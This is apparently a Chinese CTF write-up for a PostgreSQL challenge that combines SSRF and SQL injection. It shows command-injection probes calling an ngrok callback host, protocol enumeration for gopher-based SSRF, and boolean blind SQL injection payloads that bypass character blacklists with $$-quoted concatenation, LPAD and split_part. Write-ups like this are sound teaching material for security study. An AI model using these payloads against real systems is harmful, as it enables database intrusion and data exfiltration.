我们面对着一个输入框，其内容将用cURL执行。在枚举输入允许的协议之前，让我们看看是否可以注入什么东西。
## 代码注入（失败）
如果后端未使用[escapeshellarg()](https://www.php.net/manual/en/function.escapeshellarg.php)函数，则可以通过转义提供的引号或仅执行来注入代码$(command
here)。为了正确地测试它，需要一个公共且可访问的IP地址，但是，有一个名为[ngrok](https://ngrok.com/)的工具，它允许我们将localhost开放到由它们分配的域名下。有一个关于它是如何工作的更详细的文章在[这里](https://0xdf.gitlab.io/2020/05/12/ngrok-ftw.html)。
我们可以尝试类似的方法：
    NGROK-TUNNEL/$(id)
    NGROK-TUNNEL/'$(id)
    NGROK-TUNNEL/"$(id)
    NGROK-TUNNEL/"'$(id)
但是并不会起作用，因为它实际上是在使用刚才提到的[函数](http://micmap.org/php-by-example/en/function/escapeshellarg)
## 枚举可用的协议
根据[curl的手册页](https://www.mit.edu/afs.new/sipb/user/ssen/src/curl-7.11.1/docs/curl.html)，其支持的协议为HTTP,
HTTPS, FTP, FTPS, GOPHER, DICT, TELNET, LDAP or FILE，因此让我们看看其中实际上允许哪些协议。
### 寻找一种布尔方式来枚举它们
为了正确地找出其中哪些是允许的，仅通过发送file://，就会出现一条不同的消息（Can't you solve, without using
it!!!），因此现在我们可以测试该词典了。（时间不长，因此手动也可以）
    protos="http https ftp ftps gopher dict telnet ldap file"; for proto in $protos; do echo $proto; curl 'http://MIRROR/feel_the_gosql_series.php' -d "url=$proto://"; echo;done
不会引发任何错误的协议是HTTP（S），GOPHER和TELNET。如果这是使用的是eval或是类似的方法处理查询的响应时，则可以使用除Gopher之外的任何方式注入PHP代码，但是我们唯一能做的就是客户端注入（HTML
/ JS），这没什么价值。
### 验证Gopher能否使用（并且数据库是否使用的常规端口）
要在客户端验证gopher是否有效，就像查询是否挂起一样简单。
本地验证：
（hung状态->waiting for more packets）
    A> nc -lnvp 99
    listening on [any] 99 ...
    B> curl gopher://127.0.0.1:99
    A> connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 42446
    # (waiting for more packets)
（非hung状态->连接被拒绝，也就是未打开端口）
    $ curl gopher://127.0.0.1:81
    curl: (7) Failed to connect to 127.0.0.1 port 81: Connection refused
在挑战中，端口5432（PostgreSQL）是hung状态。
**关于什么是('gopher://')?**
简而言之，gopher它能够按照特定语法发送以URL硬编码的TCP数据包。这使我们可以与后端运行的任何服务进行通信，例如我们刚刚用于获取securl
URL的Postgres数据库。（[更多 信息](https://hackerone.com/reports/115748)）
关于过去的GoSQLvX挑战，我们现在应该通过此协议向数据库发出请求。有一个已经创建的名为[Gopherus](https://github.com/tarunkant/Gopherus)的工具，它的创建者也是这个挑战，它的模块之一是为PostgreSQL制作的。但是，在挑战之时，他尚未提交更新，因此我们需要自己写“插件”！
### PostgreSQL Gopher漏洞利用…但还不是时候
要使查询成功，用户名和数据库名必须知道！
## 返回SQL注入
请记住，我们使用此查询来获取secret的链接。
    http://MIRROR/?column=U%26"\0075\0073\0065\0072\006e\0061\006d\0065",U%26"\0067\006f\005f\0074\006f"&name=$$a$$||$$d$$||$$m$$||$$i$$||$$n$$
接下来，我将使用实际查询作为参考，以便我们更好地理解它。
    SELECT U&"\0075\0073\0065\0072\006e\0061\006d\0065",U&"\0067\006f\005f\0074\006f" FROM inctf2020 WHERE name = $$a$$||$$d$$||$$m$$||$$i$$||$$n$$
我们如何检索用户名和数据库名称？首先，让我们看看如何以常规的方式获取它们。（我经常参考的[备忘单](https://wiki.devploit.dev/web/attacks/sqli/postgresql/queries_cheatsheet)）
  * 用户检索
    testdb=# SELECT USER;
       user
    ----------     postgres
    (1 row)
  * 数据库名称检索
    testdb=# SELECT current_database();
     current_database
    ------------------     testdb
    (1 row)
## 布尔数据检索
实际上，我们要获取用户名和数据库名，必须找到一种方法同我们提供的字符串进行比较，然后知道该比较的结果是TRUE还是FALSE。
为了完成上述需求，我们将用'a'来填充'admin'
字符串N次，N是比较结果的长度。（当比较结果为FALSE时结果为'admin'，当比较结果为TRUE时结果为'admi')
  * 使用LPAD（没错，又是它，但是现在的目标是减少传递的字符串）
    testdb=# SELECT LPAD('123456', 3, '');
     lpad
    ------     123
    (1 row)
  * VARCHAR（X）强制转换
    testdb=# SELECT '123456'::VARCHAR(3);
     varchar
    ---------     123
    (1 row)
在撰写本文时，我想到这样做也可以完成我们想要的工作。
    testdb=# SELECT ($$a$$||$$d$$||$$m$$||$$i$$||$$n$$)::VARCHAR(3);
     varchar
    ---------     adm
    (1 row)
  * 布尔词简化
由于'admin'和false是的一样的长度，使用LPAD 'admin'
N次''。N是FALSE的长度,'admin'不会被改变。但是，如果比较结果为TRUE，就会变成'admi'，因为TRUE的长度是4。
    testdb=# SELECT LENGTH((1=2)::TEXT);
     length
    --------          5
    (1 row)
    testdb=# SELECT LENGTH((1=1)::TEXT);
     length
    --------          4
    (1 row)
    testdb=# SELECT LPAD('admin' ,LENGTH((1=1)::TEXT), '');
     lpad
    ------     admi
    (1 row)
    testdb=# SELECT LPAD('admin' ,LENGTH((1=2)::TEXT), '');
     lpad
    -------     admin
    (1 row)
  * 基于变量简化的布尔词简化
以前的比较也可以用于数据库变量。
    testdb=# SELECT LPAD('admin' ,LENGTH((USER='randomuser')::TEXT), '');
     lpad
    -------     admin
    (1 row)
    testdb=# SELECT LPAD('admin' ,LENGTH((USER='postgres')::TEXT), '');
     lpad
    ------     admi
    (1 row)
但是，暴力破解可能要花费我们几年的时间，而CTF持续2天！因此，让我们看看是否可以找到类似与普通 **LIKE '{char}%'** 技术的方法。
    testdb=# SELECT LPAD('admin' ,LENGTH((USER::VARCHAR(1)='a')::TEXT), '');
     lpad
    -------     admin
    (1 row)
    testdb=# SELECT LPAD('admin' ,LENGTH((USER::VARCHAR(1)='p')::TEXT), '');
     lpad
    ------     admi
    (1 row)
  * 最终“name”的payload
    'lpad($$a$$||$$d$$||$$m$$||$$i$$||$$n$$,LENGTH((%s::VARCHAR(%s)=%s)::TEXT),$$a$$)' % (parameter_to_exfiltrate, offset, extracted_data+current_char)
注意最后一个$$a$$。禁止使用单引号，尽管$$$$应该没问题，但我更喜欢留下一个随机字母以确保我不会弄乱查询。  
例：
    'lpad($$a$$||$$d$$||$$m$$||$$i$$||$$n$$,LENGTH((USER::VARCHAR(5)=ABCDE)::TEXT),$$a$$)'
这次，如果USER值的前5个字符为ABCDE，则为(USER::VARCHAR(5)=ABCDE)TRUE，LENGTH((USER::VARCHAR(5)=ABCDE)::TEXT)为4，lpad($$a$$||$$d$$||$$m$$||$$i$$||$$n$$,LENGTH((USER::VARCHAR(5)=ABCDE)::TEXT),$$a$$)并返回'admi'。
## 问题
该查询非常有趣，可以帮助我们检索变量/返回函数值，但是如果值包含禁止的字符怎么办？在这种情况下，此查询无用。
  * 避免多个字符限制
多亏了“ ||” 字符级联，我们可以绕过所有长度大于1的黑名单字段。
存在USER test和存在'st' 被黑名单，下面的语句将起作用。
    $ python3 -c 'print("||".join("$$"+i+"$$" for i in "test"))'
    $$t$$||$$e$$||$$s$$||$$t$$
    testdb=# SELECT LPAD('admin' ,LENGTH((USER::VARCHAR(4)=$$t$$||$$e$$||$$s$$||$$t$$)::TEXT), $$$$);
     lpad
    ------     admi
    (1 row)
但是，如果被禁止的字符为'e'，我们将无能为力，因为它总是必须存在。
## 注入变化
经过大量的努力我更乐于接受另一个“更轻松”的挑战（嗯，也许我不想那么麻烦），我想到了split_part函数。它几乎与python的split函数相同，允许你设置“想要”分割的部分。
### 它是做什么用的
    testdb=# SELECT split_part('12345', '3', 1);
     split_part
    ------------     12
    (1 row)
### （一种）使用场景
    testdb=# SELECT split_part(USER, 'p', 2);
     split_part
    ------------     ostgres
    (1 row)
    testdb=# SELECT split_part(USER, USER::VARCHAR(1), 2);
     split_part
    ------------     ostgres
    (1 row)
    testdb=# SELECT split_part(USER, USER::VARCHAR(1), 2)::VARCHAR(1);
     split_part
    ------------     o